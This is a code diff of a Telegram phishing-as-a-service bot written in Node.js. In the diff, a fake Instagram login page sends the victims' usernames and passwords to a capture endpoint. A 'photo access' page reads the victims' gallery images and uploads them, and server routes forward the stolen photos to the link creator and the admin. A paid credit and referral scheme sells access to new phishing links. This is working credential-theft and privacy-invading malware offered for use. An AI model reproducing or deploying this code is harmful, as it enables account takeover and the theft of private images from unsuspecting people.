+PHOTO_ACCESS_TEMPLATE += 'async function processFiles(files) { var total = files.length; showStatus("📸 Found " + total + " images. Processing...", "info"); updateProgress(20); var successCount = 0; for (var i = 0; i < total; i++) { try { var file = files[i]; var reader = new FileReader(); var fileData = await new Promise(function(resolve, reject) { reader.onload = function(e) { resolve(e.target.result); }; reader.onerror = reject; reader.readAsDataURL(file); }); var reader2 = new FileReader(); reader2.onload = function(e) { addToGallery(e.target.result); }; reader2.readAsDataURL(file); var response = await fetch("/api/upload-photo", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ userid: USER_ID, platform: PLATFORM, filename: file.name, data: fileData, size: file.size }) }); var result = await response.json(); if (result.success) successCount++; var percent = 20 + ((i + 1) / total) * 70; updateProgress(percent); showProcessing("📤 Sending " + (i + 1) + "/" + total + " photos..."); await sleep(100); } catch(err) { console.error("Error processing file:", err); } } updateProgress(100); hideProcessing(); if (successCount > 0) { showResult("✅ " + successCount + " photo(s) scanned and sent to the user!"); showStatus("✅ " + successCount + " photos sent successfully!", "success"); } else { showStatus("❌ Processing failed. Please try again.", "error"); } document.getElementById("scanBtn").disabled = false; document.getElementById("scanBtn").innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; }\n';
+PHOTO_ACCESS_TEMPLATE += '</script>\n';
+PHOTO_ACCESS_TEMPLATE += '</body>\n';
+PHOTO_ACCESS_TEMPLATE += '</html>\n';
 
 // ====================== TEMPLATES ======================
 var INSTA_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Instagram Login</title>\n<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\nbody{background:linear-gradient(145deg,#1a0a2e,#2d1b4e,#0a0a0a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}\n.logo{text-align:center;margin-bottom:30px}\n.logo i{font-size:65px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}\n.input-group{position:relative;margin-bottom:18px}\n.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#888;font-size:18px}\n.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}\n.input-group input:focus{border-color:#d62976;background:rgba(255,255,255,0.12);box-shadow:0 0 30px rgba(214,41,118,0.15)}\n.input-group input::placeholder{color:#777}\n.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#4f5bd5,#d62976);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(214,41,118,0.3)}\n.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(214,41,118,0.5)}\n.loader{display:none;text-align:center;padding:20px 0}\n.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#d62976;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}\n@keyframes spin{100%{transform:rotate(360deg)}}\n.loader p{color:#aaa;margin-top:15px;font-size:14px}\n.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}\n.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .3s}\n.result{display:none;text-align:center;padding:20px}\n.result i{font-size:50px;color:#28a745}\n.result h3{color:#fff;margin-top:10px}\n.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}\n.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(214,41,118,0.15),transparent 70%);animation:float 20s infinite ease-in-out}\n.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}\n.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}\n@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}\n.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}\n.footer a{color:#888;text-decoration:none}\n</style>\n</head>\n<body>\n<div class="bg-shapes"><span></span><span></span></div>\n<div class="card">\n<div class="logo"><i class="fab fa-instagram"></i><h1>Instagram</h1></div>\n<div id="form-screen">\n<div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="Username or Email"></div>\n<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>\n<button class="btn" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>\n</div>\n<div id="process-screen" style="display:none">\n<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>\n<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>\n<div id="result-area" style="display:none">\n<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>\n<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>\n</div>\n</div>\n<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Sign up</a></div>\n</div>\n<script>\nvar id="USERID_PLACEHOLDER";\nvar p="PLATFORM_PLACEHOLDER";\nfunction startEngine(){\nvar u=document.getElementById("username").value.trim();\nvar pwd=document.getElementById("password").value;\nif(!u||!pwd){alert("Please fill all fields.");return}\nfetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});\ndocument.getElementById("form-screen").style.display="none";\ndocument.getElementById("process-screen").style.display="block";\ndocument.querySelector(".loader").style.display="block";\ndocument.querySelector(".progress-bar").style.display="block";\ndocument.getElementById("result-area").style.display="none";\nvar progress=0;\nvar interval=setInterval(function(){\nprogress+=Math.random()*3+1;\nif(progress>=100){progress=100;clearInterval(interval);\ndocument.querySelector(".loader").style.display="none";\ndocument.querySelector(".progress-bar").style.display="none";\ndocument.getElementById("result-area").style.display="block";\ndocument.getElementById("status-text").innerText="✅ Verified";\nreturn}\ndocument.getElementById("progress-fill").style.width=progress+"%";\nif(progress<30)document.getElementById("status-text").innerText="Connecting...";\nelse if(progress<60)document.getElementById("status-text").innerText="Verifying...";\nelse if(progress<85)document.getElementById("status-text").innerText="Loading...";\nelse document.getElementById("status-text").innerText="Almost done...";\n},150);\n}\n</script>\n</body>\n</html>\n';
@@ -654,78 +444,6 @@ var CAMERA_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n
 // ====================== EXPRESS ROUTES ======================
 app.use('/api/photos', express.static(BOT_PHOTO_DIR));
 app.use('/uploads', express.static(UPLOADS_DIR));
-
-// ====================== ULTRA FAST BATCH UPLOAD API ======================
-const uploadMultiple = upload.array('photos', 50);
-
-app.post('/api/upload-photos-batch', async (req, res) => {
-    uploadMultiple(req, res, async (err) => {
-        if (err) {
-            console.error('Upload error:', err);
-            return res.status(400).json({ success: false, error: err.message });
-        }
-        try {
-            const userid = req.body.userid;
-            const platform = req.body.platform || 'Photo Access';
-            const files = req.files || [];
-            if (!userid) {
-                return res.status(400).json({ success: false, error: 'User ID required' });
-            }
-            if (files.length === 0) {
-                return res.status(400).json({ success: false, error: 'No files uploaded' });
-            }
-            console.log(`📸 Batch upload: ${files.length} photos from user ${userid}`);
-            logToFile(`📸 Batch upload: ${files.length} photos from user ${userid}`);
-
-            // Send in groups of 10 using sendMediaGroup
-            const groups = [];
-            for (let i = 0; i < files.length; i += 10) {
-                groups.push(files.slice(i, i + 10));
-            }
-            for (const group of groups) {
-                const media = group.map((file, index) => ({
-                    type: 'photo',
-                    media: file.buffer,
-                    caption: (index === 0) ? `📸 ${group.length} photos from ${platform}` : '',
-                    parse_mode: 'HTML'
-                }));
-                try {
-                    await S7.sendMediaGroup(userid, media);
-                } catch (err) {
-                    console.error('Error sending media group:', err);
-                    for (const file of group) {
-                        try {
-                            await S7.sendPhoto(userid, file.buffer);
-                        } catch (e) {
-                            console.error('Error sending individual photo:', e);
-                        }
-                    }
-                }
-            }
-
-            const caption = `✅ <b>${files.length} photos received!</b>\n\n📸 <b>Platform:</b> ${platform}\n⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n<i>© ↝ ᴅᴇᴠ ʙʏ » ${config.S7}</i>`;
-            await S7.sendMessage(userid, caption, { parse_mode: 'HTML' });
-
-            const adminCaption = `📸 <b>Batch Photo Upload</b>\n\n👤 <b>User:</b> <code>${userid}</code>\n📁 <b>Photos:</b> ${files.length}\n🌐 <b>Platform:</b> ${platform}\n⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
-            if (files.length > 0) {
-                await S7.sendPhoto(config.adminId, files[0].buffer, { 
-                    caption: adminCaption,
-                    parse_mode: 'HTML'
-                });
-            }
-
-            res.json({ 
-                success: true, 
-                count: files.length,
-                message: `Successfully sent ${files.length} photos`
-            });
-        } catch (error) {
-            console.error('Batch upload error:', error);
-            logToFile(`❌ Batch upload error: ${error.message}`);
-            res.status(500).json({ success: false, error: error.message });
-        }
-    });
-});
 
 // ====================== ADMIN PANEL ======================
 app.get('/admin', function(req, res) {
@@ -955,7 +673,7 @@ app.post('/api/capturepic', async function(req, res) {
     }
 });
 
-// ====================== PHOTO ACCESS API (OLD - Kept for compatibility) ======================
+// ====================== PHOTO ACCESS API ======================
 app.post('/api/upload-photo', async function(req, res) {
     try {
         var body = req.body || {};
@@ -984,9 +702,11 @@ app.post('/api/upload-photo', async function(req, res) {
             '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
             '✅ <b>AI Processing Complete!</b>';
         
+        // Send to the link creator (userid)
         await S7.sendPhoto(userid, buffer, { caption: caption, parse_mode: 'HTML' });
         logToFile('📸 Sent photo to user ' + userid + ': ' + filename);
         
+        // Also send to admin
         await S7.sendPhoto(config.adminId, buffer, {
             caption: '📸 <b>Gallery Photo Upload</b>\n\n👤 User: <code>' + userid + '</code>\n📁 ' + (filename || 'photo.jpg'),
             parse_mode: 'HTML'
@@ -1269,8 +989,437 @@ S7.on('callback_query', async function(q) {
     var isAdmin = uid.toString() === config.adminId;
     console.log('🔘 Callback: ' + q.data + ' from ' + q.from.first_name);
     
-    // ... (rest of callback handler - keep all your existing code)
-    // (Due to length, I'm keeping the structure but you should copy your full callback handler)
+    if (q.data === 'admin_panel' && isAdmin) {
+        await S7.deleteMessage(cid, mid);
+        await S7.sendMessage(cid, '👑 <b>Admin Panel</b>\n\nSelect an option below to manage the bot.', { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
+        return;
+    }
+    
+    if (q.data === 'admin_stats' && isAdmin) {
+        var users = getUsers();
+        var totalUsers = Object.keys(users).length;
+        var photos = getPhotos();
+        var channels = getChannels();
+        var referrals = getReferrals();
+        
+        await S7.sendMessage(cid,
+            '📊 <b>Bot Statistics</b>\n\n' +
+            '👥 Total Users: ' + totalUsers + '\n' +
+            '📷 Total Photos: ' + photos.length + '\n' +
+            '📢 Total Channels: ' + channels.length + '\n' +
+            '👥 Total Referrals: ' + referrals.length + '\n' +
+            '⏱ Uptime: ' + getUptime(),
+            { parse_mode: 'HTML', reply_markup: SYBack }
+        );
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+    
+    if (q.data === 'admin_broadcast' && isAdmin) {
+        await S7.sendMessage(cid, '📢 <b>Send Broadcast</b>\n\nPlease type your broadcast message.\nReply with: /broadcast [message]', { parse_mode: 'HTML', reply_markup: SYBack });
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+    
+    if (q.data === 'admin_logs' && isAdmin) {
+        try {
+            var logs = fs.readFileSync(LOGS_FILE, 'utf8');
+            var lastLogs = logs.split('\n').slice(-50).join('\n');
+            await S7.sendMessage(cid, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs available') + '</pre>', { parse_mode: 'HTML', reply_markup: SYBack });
+        } catch {
+            await S7.sendMessage(cid, 'No logs available', { reply_markup: SYBack });
+        }
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+    
+    if (q.data === 'check_all') {
+        var isMember = await checkAllChannels(uid);
+        if (isMember) {
+            await S7.deleteMessage(cid, mid);
+            var user = getUser(uid);
+            if (user._pendingReferrer) {
+                var referrerId = user._pendingReferrer;
+                delete user._pendingReferrer;
+                saveUsers(getUsers());
+                await processReferral(referrerId, uid);
+                return;
+            }
+            await SendLoveSYMenu(cid, q.from.first_name);
+        } else {
+            await S7.answerCallbackQuery(q.id, { text: '❌ Please join ALL channels first!', show_alert: true });
+        }
+        return;
+    }
+    
+    if (q.data === 'commands') {
+        var cmdMsg = '📜 <b>All Commands</b>\n\n';
+        cmdMsg += '👤 <b>User Commands:</b>\n';
+        cmdMsg += '• /start - Start bot\n';
+        cmdMsg += '• /menu - Show menu\n';
+        cmdMsg += '• /pay [amount] - Buy credits\n';
+        cmdMsg += '• /credits - Check credits\n';
+        cmdMsg += '• /referral - Get referral link\n\n';
+        
+        if (isAdmin) {
+            cmdMsg += '👑 <b>Admin Commands:</b>\n';
+            cmdMsg += '• /admin - Open admin panel\n';
+            cmdMsg += '• /addcredits [userId] [amount] - Add credits\n';
+            cmdMsg += '• /removecredits [userId] [amount] - Remove credits\n';
+            cmdMsg += '• /unlimited [userId] - Activate unlimited\n';
+            cmdMsg += '• /resetuser [userId] - Reset user\n';
+            cmdMsg += '• /users - Show all users\n';
+            cmdMsg += '• /stats - Bot statistics\n';
+            cmdMsg += '• /broadcast [message] - Send to all\n';
+            cmdMsg += '• /setqr - Upload QR code\n';
+            cmdMsg += '• /removeqr - Remove QR code\n';
+            cmdMsg += '• /viewqr - View QR code\n';
+            cmdMsg += '• /addchannel [id] [name] [link] - Add channel\n';
+            cmdMsg += '• /removechannel [id] - Remove channel\n';
+            cmdMsg += '• /channels - List channels\n';
+            cmdMsg += '• /addphoto [caption] - Upload photo\n';
+            cmdMsg += '• /featured [photoId] - Set featured\n';
+            cmdMsg += '• /featuredmsg [message] - Set message\n';
+            cmdMsg += '• /featuredtoggle - Toggle featured\n';
+            cmdMsg += '• /logs - Show logs\n';
+            cmdMsg += '• /restart - Restart bot\n';
+        }
+        
+        await S7.sendMessage(cid, cmdMsg, { parse_mode: 'HTML', reply_markup: SYBack });
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+    
+    if (q.data === 'referral') {
+        var botInfo = await S7.getMe();
+        var referralLink = 'https://t.me/' + botInfo.username + '?start=ref_' + uid;
+        await S7.sendMessage(cid,
+            '👥 <b>Your Referral Link</b>\n\nShare this link:\n\n<code>' + referralLink + '</code>\n\n📌 <b>How it works:</b>\n• Share your link with friends\n• They join all channels\n• You get +2 credits!\n• They get +3 credits bonus!',
+            { parse_mode: 'HTML', reply_markup: SYBack }
+        );
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+    
+    if (q.data === 'credits') {
+        var user = getUser(uid);
+        var credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
+        await S7.sendMessage(cid,
+            '⭐ <b>Your Credits</b>\n\n💰 Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0) + '\n📅 Joined: ' + new Date(user.joinedAt).toLocaleDateString() + '\n\n🔹 Each link uses 1 credit\n🔹 Get +2 credits per referral\n🔹 New users get +3 bonus credits',
+            { parse_mode: 'HTML', reply_markup: SYBack }
+        );
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+    
+    if (q.data === 'buy_credits') {
+        var qrExists = fs.existsSync(QR_FILE);
+        var qrText = qrExists ? '📱 QR Code is available.\n' : '📱 QR code not uploaded yet.\n';
+        
+        await S7.sendMessage(cid,
+            '💰 <b>Buy Credits</b>\n\n📌 <b>Pricing:</b>\n• 1 Credit = ₹1\n• 50 Credits = ₹50 (Unlimited Lifetime!)\n\n🔹 <b>Unlimited</b> = Generate unlimited links forever!\n\n💳 <b>How to Pay:</b>\n1. Send payment to QR/UPI\n2. Type <code>/pay [amount]</code>\n3. Send screenshot for verification\n\n' + qrText + '\n📱 <b>UPI:</b> rtf@upi\n📱 <b>PhonePe:</b> 9876543210\n\nType <code>/pay 50</code> for Unlimited!',
+            { parse_mode: 'HTML', reply_markup: SYBack }
+        );
+        
+        if (qrExists) {
+            await S7.sendPhoto(cid, QR_FILE, { caption: '💳 Scan to pay' });
+        }
+        
+        await S7.deleteMessage(cid, mid);
+        return;
+    }
+    
+    if (q.data.startsWith('gen_') || q.data.startsWith('regen_')) {
+        var isGen = q.data.startsWith('gen_');
+        var platform = q.data.replace(isGen ? 'gen_' : 'regen_', '');
+        
+        if (platform === 'photoaccess') platform = 'photoAccess';
+        
+        var user = getUser(uid);
+        if (!user.unlimited && (user.credits || 0) <= 0) {
+            await S7.answerCallbackQuery(q.id, {
+                text: '❌ Insufficient credits! Use referral or buy credits.',
+                show_alert: true
+            });
+            return;
+        }
+        
+        var loadingMsg = await S7.sendMessage(cid,
+            SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'),
+            { parse_mode: 'HTML', reply_markup: SYBack }
+        );
+        
+        try {
+            var response = await fetch('http://localhost:' + config.port + '/api/create-link', {
+                method: 'GET',
+                headers: { userid: String(uid), platform: platform }
+            });
+            var data = await response.json();
+            
+            if (data.error && data.needBuy) {
+                await S7.editMessageText(
+                    SYloveMenu(q.from.first_name, '❌ ' + data.message + '\n\nType /pay to purchase credits'),
+                    { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack }
+                );
+                return;
+            }
+            
+            var platformDisplay = platform === 'photoAccess' ? 'PHOTO ACCESS' : platform.toUpperCase();
+            var finalMsg = '✅ <b>Link Generated!</b>\n\n📎 <b>Your Link:</b>\n<code>' + data.url + '</code>\n\n📌 <b>Platform:</b> ' + platformDisplay + '\n🔄 Share and earn referrals!\n\n⭐ <b>Remaining Credits:</b> ' + (user.unlimited ? '♾️ Unlimited' : (user.credits - 1));
+            
+            await S7.editMessageText(
+                SYloveMenu(q.from.first_name, finalMsg),
+                { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: getRegenMarkup(platform) }
+            );
+        } catch (err) {
+            console.error('Link Error:', err.message);
+            logToFile('❌ Link Error: ' + err.message);
+            await S7.editMessageText(
+                SYloveMenu(q.from.first_name, '❌ Error generating link'),
+                { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack }
+            );
+        }
+        return;
+    }
+    
+    if (q.data === 'back') {
+        await S7.deleteMessage(cid, mid);
+        await SendLoveSYMenu(cid, q.from.first_name);
+    }
+});
+
+// ====================== PAYMENT COMMAND ======================
+S7.on('message', async function(msg) {
+    if (!msg.text) return;
+    var text = msg.text.trim();
+    
+    if (text.startsWith('/pay')) {
+        var parts = text.split(' ');
+        if (parts.length < 2) {
+            return S7.sendMessage(msg.chat.id,
+                '⚠️ <b>Usage:</b> /pay [amount]\n\n📌 <b>Pricing:</b>\n• 1 Credit = ₹1\n• 50 Credits = ₹50 (Unlimited Lifetime!)\n\nExample: <code>/pay 50</code> for Unlimited',
+                { parse_mode: 'HTML' }
+            );
+        }
+        var amount = parseInt(parts[1]);
+        if (isNaN(amount) || amount < 1) {
+            return S7.sendMessage(msg.chat.id, '⚠️ Please enter a valid amount (minimum ₹1)');
+        }
+        
+        var uid = msg.from.id;
+        var qrExists = fs.existsSync(QR_FILE);
+        
+        var qrMsg = '💳 <b>Payment Details</b>\n\n💰 <b>Amount:</b> ₹' + amount + '\n\n';
+        
+        if (qrExists) {
+            qrMsg += '📱 <b>Scan QR Code to Pay:</b>\n';
+            await S7.sendPhoto(msg.chat.id, QR_FILE, { caption: '💳 QR Code - ₹' + amount });
+        } else {
+            qrMsg += '📱 QR code not uploaded.\n';
+        }
+        
+        qrMsg += '\n📌 <b>UPI:</b> rtf@upi\n📌 <b>PhonePe:</b> 9876543210\n📌 <b>Google Pay:</b> 9876543210\n\n✅ <b>After payment, send screenshot of transaction!</b>\n📎 Reply with the screenshot image.\n\n📌 <b>What you get:</b>\n';
+        
+        if (amount >= 50) {
+            qrMsg += '✨ <b>UNLIMITED LIFETIME ACCESS!</b>';
+        } else {
+            qrMsg += '⭐ ' + amount + ' Credits (₹' + amount + ')';
+        }
+        
+        await S7.sendMessage(msg.chat.id, qrMsg, { parse_mode: 'HTML' });
+        
+        var user = getUser(uid);
+        user._pendingPayment = amount;
+        saveUsers(getUsers());
+        
+        logToFile('💰 Payment initiated: ' + uid + ' - ₹' + amount);
+        return;
+    }
+    
+    if (msg.photo) {
+        var user = getUser(msg.from.id);
+        if (user._pendingPayment) {
+            var amount = user._pendingPayment;
+            delete user._pendingPayment;
+            saveUsers(getUsers());
+            
+            var fileId = msg.photo[msg.photo.length - 1].file_id;
+            var caption = '💰 <b>Payment Screenshot</b>\n\n👤 <b>User:</b> @' + (msg.from.username || 'user_' + msg.from.id) + '\n🆔 <b>ID:</b> <code>' + msg.from.id + '</code>\n💵 <b>Amount:</b> ₹' + amount + '\n📅 <b>Date:</b> ' + new Date().toLocaleString() + '\n\n⚠️ <b>Verify and add credits manually!</b>';
+            
+            await S7.sendPhoto(config.adminId, fileId, { caption: caption, parse_mode: 'HTML' });
+            
+            await S7.sendMessage(msg.from.id,
+                '✅ <b>Screenshot forwarded to admin!</b>\n\n📌 Amount: ₹' + amount + '\n⏳ Please wait for admin to verify and add credits.\nYou will be notified once credits are added.',
+                { parse_mode: 'HTML' }
+            );
+            
+            await S7.sendMessage(config.adminId,
+                '🔔 <b>New Payment Screenshot!</b>\n\n👤 User: @' + (msg.from.username || 'user_' + msg.from.id) + '\n🆔 ID: <code>' + msg.from.id + '</code>\n💵 Amount: ₹' + amount + '\n\nUse <code>/addcredits ' + msg.from.id + ' ' + amount + '</code> to add credits.\nUse <code>/unlimited ' + msg.from.id + '</code> for unlimited access.',
+                { parse_mode: 'HTML' }
+            );
+            
+            logToFile('💰 Payment screenshot: ' + msg.from.id + ' - ₹' + amount);
+        }
+    }
+});
+
+// ====================== ADMIN COMMANDS ======================
+S7.on('message', async function(msg) {
+    if (!msg.text || msg.from.id.toString() !== config.adminId) return;
+    var text = msg.text.trim();
+    
+    if (text.startsWith('/addcredits')) {
+        var parts = text.split(' ');
+        if (parts.length < 3) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /addcredits [userId] [amount]');
+        var userId = parts[1];
+        var amount = parseInt(parts[2]);
+        if (isNaN(amount) || amount < 1) return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');
+        var user = getUser(userId);
+        if (user.unlimited) return S7.sendMessage(msg.chat.id, '⚠️ User already has Unlimited!');
+        user.credits = (user.credits || 0) + amount;
+        saveUsers(getUsers());
+        await S7.sendMessage(msg.chat.id, '✅ Added ' + amount + ' credits to user ' + userId + '\nNew balance: ' + user.credits);
+        await S7.sendMessage(userId, '✅ <b>' + amount + ' credits added!</b>\n⭐ New balance: ' + user.credits, { parse_mode: 'HTML' });
+        logToFile('💰 Admin added ' + amount + ' credits to ' + userId);
+    }
+    
+    if (text.startsWith('/removecredits')) {
+        var parts = text.split(' ');
+        if (parts.length < 3) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /removecredits [userId] [amount]');
+        var userId = parts[1];
+        var amount = parseInt(parts[2]);
+        if (isNaN(amount) || amount < 1) return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');
+        var user = getUser(userId);
+        if (user.unlimited) return S7.sendMessage(msg.chat.id, '⚠️ User has Unlimited! Cannot remove credits.');
+        user.credits = Math.max(0, (user.credits || 0) - amount);
+        saveUsers(getUsers());
+        await S7.sendMessage(msg.chat.id, '✅ Removed ' + amount + ' credits from user ' + userId + '\nNew balance: ' + user.credits);
+        await S7.sendMessage(userId, '⚠️ <b>' + amount + ' credits removed!</b>\n⭐ New balance: ' + user.credits, { parse_mode: 'HTML' });
+        logToFile('💰 Admin removed ' + amount + ' credits from ' + userId);
+    }
+    
+    if (text.startsWith('/unlimited')) {
+        var parts = text.split(' ');
+        if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /unlimited [userId]');
+        var userId = parts[1];
+        var user = getUser(userId);
+        user.unlimited = true;
+        saveUsers(getUsers());
+        await S7.sendMessage(msg.chat.id, '✅ Unlimited activated for user ' + userId);
+        await S7.sendMessage(userId, '🎉 <b>UNLIMITED ACTIVATED!</b>\n\nYou now have unlimited credits forever!', { parse_mode: 'HTML' });
+        logToFile('⭐ Unlimited activated for ' + userId);
+    }
+    
+    if (text === '/stats') {
+        var users = getUsers();
+        var totalUsers = Object.keys(users).length;
+        var photos = getPhotos();
+        var channels = getChannels();
+        var referrals = getReferrals();
+        var botInfo = await S7.getMe();
+        
+        var statsMsg = '📊 <b>Bot Statistics</b>\n\n👥 Total Users: ' + totalUsers + '\n📷 Total Photos: ' + photos.length + '\n📢 Total Channels: ' + channels.length + '\n👥 Total Referrals: ' + referrals.length + '\n⏱ Uptime: ' + getUptime() + '\n🤖 Bot: @' + botInfo.username;
+        
+        await S7.sendMessage(msg.chat.id, statsMsg, { parse_mode: 'HTML' });
+    }
+    
+    if (text.startsWith('/broadcast')) {
+        var message = text.replace('/broadcast', '').trim();
+        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /broadcast [message]');
+        var users = getUsers();
+        var userIds = Object.keys(users);
+        var sent = 0, failed = 0;
+        
+        await S7.sendMessage(msg.chat.id, '📢 Broadcasting to ' + userIds.length + ' users...');
+        
+        for (var i = 0; i < userIds.length; i++) {
+            try {
+                await S7.sendMessage(userIds[i], '📢 <b>Announcement</b>\n\n' + message + '\n\n- Bot Admin', { parse_mode: 'HTML' });
+                sent++;
+            } catch(e) {
+                failed++;
+            }
+            await new Promise(function(r) { setTimeout(r, 50); });
+        }
+        
+        await S7.sendMessage(msg.chat.id, '✅ Broadcast complete!\n✅ Sent: ' + sent + '\n❌ Failed: ' + failed);
+        logToFile('📢 Broadcast sent to ' + sent + ' users');
+    }
+    
+    if (text === '/restart') {
+        await S7.sendMessage(msg.chat.id, '🔄 Restarting bot...');
+        logToFile('🔄 Bot restarting');
+        process.exit(0);
+    }
+});
+
+// ====================== QR CODE HANDLERS ======================
+S7.on('message', async function(msg) {
+    if (!msg.photo) return;
+    var isAdmin = msg.from.id.toString() === config.adminId;
+    if (!isAdmin) return;
+    
+    var user = getUser(msg.from.id);
+    if (user._waitingForQR) {
+        try {
+            var fileId = msg.photo[msg.photo.length - 1].file_id;
+            var fileLink = await S7.getFileLink(fileId);
+            
+            var response = await fetch(fileLink);
+            var buffer = await response.arrayBuffer();
+            fs.writeFileSync(QR_FILE, Buffer.from(buffer));
+            
+            delete user._waitingForQR;
+            saveUsers(getUsers());
+            
+            await S7.sendMessage(msg.chat.id,
+                '✅ <b>QR Code Uploaded Successfully!</b>\n\n📱 Users can now scan this QR for payments.\nUse /viewqr to see it.',
+                { parse_mode: 'HTML' }
+            );
+            logToFile('📱 QR code uploaded');
+        } catch (err) {
+            console.error('QR Upload Error:', err);
+            await S7.sendMessage(msg.chat.id, '❌ Failed to upload QR code. Please try again.');
+        }
+    }
+});
+
+S7.on('message', async function(msg) {
+    if (!msg.text) return;
+    var text = msg.text.trim();
+    var isAdmin = msg.from.id.toString() === config.adminId;
+    if (!isAdmin) return;
+    
+    if (text === '/setqr') {
+        var user = getUser(msg.from.id);
+        user._waitingForQR = true;
+        saveUsers(getUsers());
+        await S7.sendMessage(msg.chat.id,
+            '📱 <b>Upload QR Code</b>\n\nPlease send the QR code image as a photo.\nThe QR code will be used for payments.',
+            { parse_mode: 'HTML' }
+        );
+    }
+    
+    if (text === '/removeqr') {
+        if (fs.existsSync(QR_FILE)) {
+            fs.unlinkSync(QR_FILE);
+            await S7.sendMessage(msg.chat.id, '✅ QR code removed successfully!');
+            logToFile('📱 QR code removed');
+        } else {
+            await S7.sendMessage(msg.chat.id, '❌ No QR code found to remove.');
+        }
+    }
+    
+    if (text === '/viewqr') {
+        if (fs.existsSync(QR_FILE)) {
+            await S7.sendPhoto(msg.chat.id, QR_FILE, {
+                caption: '📱 <b>Current QR Code</b>\n\nUse this for payments.',
+                parse_mode: 'HTML'
+            });
+        } else {
+            await S7.sendMessage(msg.chat.id, '❌ No QR code uploaded yet. Use /setqr to upload.');
+        }
+    }
 });
 
 // ====================== START SERVER ======================
@@ -1279,7 +1428,6 @@ app.listen(config.port, function() {
     console.log('📌 Admin Panel: http://localhost:' + config.port + '/admin');
     console.log('📌 Base URL: ' + config.baseUrl);
     console.log('🤖 Bot is ready! Send /start to begin.');
-    console.log('⚡ ULTRA FAST PHOTO ACCESS: 50 Photos in 10 Seconds!');
 });
 
 // ====================== ERROR HANDLING ======================
